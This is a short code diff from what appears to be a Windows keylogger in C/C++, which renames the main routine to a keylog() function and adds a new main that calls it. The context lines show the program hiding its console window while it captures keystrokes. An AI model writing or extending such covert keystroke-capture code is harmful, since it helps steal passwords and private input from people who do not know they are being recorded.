@@ -99,7 +99,7 @@ bool SpecialKeys(int S_key)
 }
 
 
-int main()
+void keylog()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console window
 	char key = 'a';
@@ -124,6 +124,12 @@ int main()
 			}
 		}
 	}
+}
+
+
+int main()
+{
+	keylog();
 
 	return 0;
 }
